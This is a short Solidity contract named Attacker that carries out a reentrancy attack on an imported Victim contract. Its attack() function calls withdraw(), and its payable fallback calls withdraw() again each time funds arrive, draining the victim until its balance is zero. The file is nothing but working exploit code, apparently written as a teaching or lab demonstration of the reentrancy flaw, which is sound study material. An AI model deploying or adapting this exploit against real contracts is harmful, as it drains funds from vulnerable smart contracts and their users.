pragma solidity >= 0.5.8;

//import Victim's source code
import './Victim.sol';
contract Attacker {
    Victim v;
    uint public count;
    event LogFallback(uint c, uint balance);
 
    //Create the contract object 
    //by setting the address of the Victim
    constructor(address victim) public {
        v = Victim(victim);
    }

    function attack() public{
        v.withdraw();
    }

    //Fallback defined with external
    function () external payable {
        //emit repetition 
        emit LogFallback(count, address(this).balance);

        //Keep withdrawing till it's all gone
        if (address(v).balance != 0) {
            v.withdraw();
        }
    }
}